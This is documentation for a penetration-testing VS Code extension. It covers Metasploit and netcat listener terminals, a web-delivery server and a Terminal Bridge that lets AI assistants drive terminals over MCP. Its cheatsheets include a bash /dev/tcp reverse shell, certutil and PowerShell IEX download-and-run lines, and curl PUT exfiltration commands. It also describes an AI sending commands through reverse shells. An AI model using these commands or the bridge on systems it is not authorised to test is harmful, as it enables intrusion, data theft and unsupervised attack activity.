# Terminal Tools

Weaponized VSCode registers four specialized terminal profiles and a built-in terminal recorder. Every terminal you open in the workspace automatically inherits your project's environment variables (`$TARGET`, `$RHOST`, `$LHOST`, `$LPORT`, `$USER`, `$PASS`, `$LISTEN_ON`, and others), so there is no manual sourcing or shell setup required.

This page covers each terminal profile, the recorder, and the Terminal Bridge system that connects your terminals to AI assistants.

## Terminal Profiles Overview

The extension registers four terminal profiles through VS Code's Terminal Profile API:

| Profile | ID | Purpose |
|---------|----|---------|
| **meterpreter handler** | `weaponized.meterpreter-handler` | Metasploit multi/handler listener |
| **msfconsole** | `weaponized.msfconsole` | General-purpose Metasploit console |
| **netcat handler** | `weaponized.netcat-handler` | Netcat listener with reverse shell cheatsheet |
| **web delivery** | `weaponized.web-delivery` | HTTP file server with download/upload cheatsheet |

**To open a profile terminal:**

1. Open the Terminal panel (`Ctrl+`` ` `` / `` Cmd+` ``)
2. Click the dropdown arrow next to the `+` button
3. Select the profile from the list

Each profile terminal sends its startup command automatically after the shell initializes. Some profiles also display a **terminal message** with useful reference information before the command runs.

## Meterpreter Handler

The **meterpreter handler** profile launches `msfconsole` in quiet mode with your resource file, ready to catch a reverse shell.

### How it works

When you open this terminal, the extension runs:

```
msfconsole -q -r <resource-file> -x 'setg LHOST <your-lhost>; setg LPORT <your-lport>;'
```

- `-q` starts msfconsole in quiet mode (no banner)
- `-r` loads the resource file so the handler starts automatically
- `-x` pre-sets `LHOST` and `LPORT` as global variables from your extension settings

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.msf.console` | `msfconsole` | Path to the msfconsole binary |
| `weaponized.msf.resourcefile` | *(none)* | Path to the Metasploit resource file |
| `weaponized.lhost` | — | Your listener IP address |
| `weaponized.lport` | — | Your listener port |

### Setting up the resource file

The `weapon.setup` command creates a template resource file at `.vscode/msfconsole.rc`. Point the setting to it:

```json
{
  "weaponized.msf.resourcefile": "${workspaceFolder}/.vscode/msfconsole.rc"
}
```

Edit the RC file to configure your handler. A typical multi/handler configuration looks like:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

### Typical workflow

1. Generate a payload with `Weapon: Create msfvenom payload` from the Command Palette
2. Open the **meterpreter handler** terminal from the dropdown
3. The handler starts automatically using your RC file
4. Deliver the payload to the target
5. The meterpreter session appears in the terminal

::: tip
If you skip the `-r` resource file (leave `weaponized.msf.resourcefile` empty), the terminal still opens msfconsole in quiet mode with LHOST/LPORT pre-set. You can then configure the handler manually.
:::

## Msfconsole

The **msfconsole** profile opens a general-purpose Metasploit console with your environment pre-loaded.

### How it works

When you open this terminal, the extension runs:

```
msfconsole -x 'setg LHOST <your-lhost>; setg LPORT <your-lport>;'
```

Unlike the meterpreter handler, this profile does **not** use quiet mode and does **not** load a resource file by default. It is meant for general Metasploit work: searching modules, running exploits, managing sessions.

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.msf.console` | `msfconsole` | Path to the msfconsole binary |
| `weaponized.lhost` | — | Pre-set as global LHOST |
| `weaponized.lport` | — | Pre-set as global LPORT |

### When to use msfconsole vs. meterpreter handler

- **meterpreter handler** -- for catching reverse shells. Loads an RC file, runs in quiet mode, starts the handler immediately.
- **msfconsole** -- for everything else. Module search, auxiliary scanners, exploit development, session management.

You can have both open simultaneously. They are independent Metasploit instances.

## Netcat Handler

The **netcat handler** profile starts a netcat listener and displays a reverse shell cheatsheet directly in the terminal.

### How it works

When you open this terminal, two things happen:

1. A **terminal message** is displayed with reverse shell one-liners, pre-populated with your `$LHOST` and `$LPORT`
2. The netcat command runs and starts listening

The default command is:

```
rlwrap -I -cAr netcat -lvvp $LPORT
```

- `rlwrap` wraps netcat with GNU readline, giving you arrow-key history navigation and line editing in the reverse shell
- `-I` sets input mode for UTF-8
- `-cAr` enables filename completion, ANSI color passthrough, and auto-recall
- `-lvvp` tells netcat to listen verbosely on the specified port

### Reverse shell cheatsheet

When the terminal opens, you will see a message block like this:

```
IP ADDRESS: 10.10.14.5    PORT: 4444
Basic Reverse Shell Command:
    /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
Advanced Reverse Shell Command:
    https://rev.eson.ninja/?ip=10.10.14.5&port=4444
```

The IP and port are taken from your `weaponized.lhost` and `weaponized.lport` settings. Copy the one-liner you need and run it on the target.

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.netcat` | `rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}` | The full netcat command |
| `weaponized.lhost` | — | Displayed in the cheatsheet |
| `weaponized.lport` | — | Used in the listen command and cheatsheet |

### Customizing the netcat command

You can replace `netcat` with any listener. For example, to use `ncat` (from Nmap):

```json
{
  "weaponized.netcat": "rlwrap -I -cAr ncat -lvvp ${config:weaponized.lport}"
}
```

Or use `pwncat-cs` for an upgraded shell experience:

```json
{
  "weaponized.netcat": "pwncat-cs -lp ${config:weaponized.lport}"
}
```

The `${config:weaponized.lport}` placeholder is resolved by VS Code at runtime to the value of your `weaponized.lport` setting.

::: tip
Open multiple netcat handler terminals on different ports by changing `weaponized.lport` between launches, or override the port directly in the setting string.
:::

## Web Delivery

The **web delivery** profile starts an HTTP file server and displays download/upload command cheatsheets for both Linux and Windows targets.

### How it works

When you open this terminal, two things happen:

1. A **terminal message** displays a comprehensive cheatsheet of download, upload, and fileless execution commands
2. The HTTP server starts serving files

The default command is:

```
simplehttpserver -listen 0.0.0.0:$LISTEN_ON -verbose -upload
```

This uses [pdteam/simplehttpserver](https://github.com/pdteam/simplehttpserver), which supports both file downloads and PUT-based uploads.

### File transfer cheatsheet

The terminal message contains ready-to-use commands. Here is what it looks like (with your IP and port substituted):

**Downloading (target pulls files from you):**

```bash
# Linux
curl --output filename http://10.10.14.5:8080/fname
wget http://10.10.14.5:8080/fname

# Windows
certutil.exe -urlcache -f http://10.10.14.5:8080/fname fname.exe
invoke-webrequest -outfile fname -usebasicparsing -uri http://10.10.14.5:8080/fname
```

**Fileless execution (PowerShell in-memory):**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/fname')
```

**Uploading (target pushes files to you):**

```bash
# Linux
curl http://10.10.14.5:8080/uploadfile --upload-file filename
curl http://10.10.14.5:8080/uploadfile -T filename
wget --output-document - --method=PUT http://10.10.14.5:8080/uploadfile --body-file=filename

# Windows (PowerShell)
invoke-webrequest -Uri http://10.10.14.5:8080/uploadfile -Method PUT -InFile filename
```

Every command has the filename at the end so you can easily edit it to match your actual file.

::: warning
Upload support requires a server that accepts PUT requests. The default `simplehttpserver` with `-upload` handles this. If you switch to `python3 -m http.server`, uploads will not work.
:::

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.webdelivery` | `simplehttpserver -listen 0.0.0.0:${config:weaponized.listenon} -verbose -upload` | The HTTP server command |
| `weaponized.listenon` | — | Port for the web delivery server |
| `weaponized.lhost` | — | Your IP, shown in the cheatsheet commands |

### Customizing the server

To use Python's built-in HTTP server instead:

```json
{
  "weaponized.webdelivery": "python3 -m http.server ${config:weaponized.listenon}"
}
```

Or PHP's built-in server:

```json
{
  "weaponized.webdelivery": "php -S 0.0.0.0:${config:weaponized.listenon}"
}
```

### Typical workflow

1. Place your payloads, scripts, or tools in the workspace (or a dedicated staging directory)
2. Open the **web delivery** terminal
3. Copy the appropriate download command from the cheatsheet
4. Paste it into your reverse shell or target session, editing the filename
5. For exfiltration, use the upload commands to pull files back from the target

## Terminal Recorder

The Terminal Recorder captures terminal activity to a log file for auditing and post-engagement review. It hooks into VS Code's Shell Integration API (`onDidStartTerminalShellExecution`) to intercept commands and their output.

### Starting the recorder

Open the Command Palette and run:

```
Weapon: Start/Register terminal logger
```

You will be prompted for three things:

1. **Log file path** -- where to save the log. Default: `${workspaceFolder}/.vscode/.terminal.log`
2. **Recording mode** -- what to capture (see table below)
3. **Terminal selection** -- which terminals to record, by process ID. Select specific terminals or choose "All terminals"

### Recording modes

| Mode | What it captures |
|------|-----------------|
| `command-only` | Only the commands you enter |
| `output-only` | Only the output produced by commands |
| `command-and-output` | Both commands and their output |
| `netcat-handler` | Output only from terminals named "netcat handler" |

### Stopping the recorder

Open the Command Palette and run:

```
Weapon: Stop/Unregister terminal logger
```

You will see a list of active recorders (by mode, filename, and path). Select the one to stop.

### Auto-start on activation

To start recording automatically whenever the extension activates, add these settings:

```json
{
  "weaponized.terminal-log.enabled": true,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-only"
}
```

When `weaponized.terminal-log.enabled` is `true`, the recorder registers itself during extension activation using the configured path and level. No manual command needed.

### Log format

Each log entry is timestamped and includes the terminal's process ID, name, and working directory:

```
weaponized-terminal-logging:[1713500000000][terminalid: 12345][terminalName: zsh] user@/home/kali/workspace$ nmap -sC -sV 10.10.10.10
```

In `command-and-output` or `output-only` mode, the command output follows directly after the log header.

### Configuration reference

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.terminal-log.enabled` | `false` | Auto-start recording on extension activation |
| `weaponized.terminal-log.path` | `${workspaceFolder}/.vscode/.terminal.log` | Log file path |
| `weaponized.terminal-log.level` | `command-only` | Recording mode |

::: tip
Use `netcat-handler` mode during engagements to automatically log all reverse shell sessions without cluttering the log with your own terminal activity. This mode only captures output from terminals named "netcat handler", so your regular shell commands are excluded.
:::

## Terminal Bridge

The Terminal Bridge is an internal subsystem that tracks all open VS Code terminals and enables programmatic interaction. You do not use it directly, but it powers several features behind the scenes.

### What it provides

- **MCP Server terminal tools** -- `list_terminals`, `read_terminal`, `send_to_terminal`, `create_terminal`
- **Terminal output buffering** -- each terminal's output is buffered in memory (up to 64KB per terminal, flushed every 500ms to storage)
- **Profile-based creation** -- external AI clients can create specialized terminals (netcat, msfconsole, meterpreter, web-delivery) via MCP

### How it works

When the extension activates, the Terminal Bridge:

1. Creates a `terminals/` directory in the extension's storage area
2. Assigns a unique ID to every open terminal
3. Listens for new terminals opening and closing
4. Hooks into `onDidStartTerminalShellExecution` to capture command output
5. Writes buffered output to per-terminal log files (truncated at 64KB, keeping the tail)

### AI-driven terminal interaction

An AI assistant connected via MCP can:

1. **List your open terminals** -- see all terminal names, IDs, active status, and working directories
2. **Read recent output** -- retrieve the last N lines from any terminal by ID or name
3. **Send commands** -- execute commands in any terminal programmatically
4. **Create new terminals** -- spin up specialized terminals using profile names (`netcat`, `msfconsole`, `meterpreter`, `web-delivery`) or plain shells

For example, an AI assistant could:
- Open a netcat handler terminal
- Read the output to see when a reverse shell connects
- Send commands through the reverse shell
- Create a web delivery terminal to transfer tools to the target

See [AI & MCP Integration](./ai-and-mcp.md) for details on connecting AI clients and using terminal tools.

### MCP terminal tool reference

| Tool | Description |
|------|-------------|
| `list_terminals` | Returns all open terminals with ID, name, active status, and cwd |
| `read_terminal` | Reads recent output from a terminal by ID or name |
| `send_to_terminal` | Sends a command string to a terminal |
| `create_terminal` | Creates a new terminal, optionally using a profile (`netcat`, `msfconsole`, `meterpreter`, `web-delivery`) |

## Migration from v0.4.x

::: info Migrating from the shell-based version?
If you used the older shell-based Weaponized VSCode (v0.4.x and earlier), here is what changed for terminal functionality:

- **Terminal profiles**: Previously defined as shell aliases and functions in `~/.zshrc`. Now registered as native VS Code Terminal Profile API providers -- they appear in the terminal dropdown and work regardless of your shell.
- **Environment variables**: Previously sourced from `.vscode/env.zsh` on terminal start (zsh only). Now injected via VS Code's `EnvironmentVariableCollection` API, which works for all terminal types (bash, zsh, fish, PowerShell).
- **Shell helper function**: The `weapon_vscode_launch_helper` function in `~/.zshrc` is still useful for loading `.vscode/.zshrc` utility functions (`differ()`, `ntlm()`, `url()`, `proxys()`), but environment variables no longer depend on it.
- **Terminal recording**: Did not exist in v0.4.x. The built-in terminal recorder now provides four recording modes with timestamped logs.
- **Programmatic terminal access**: Did not exist in v0.4.x. The Terminal Bridge now enables AI-driven terminal interaction through the MCP server.
:::
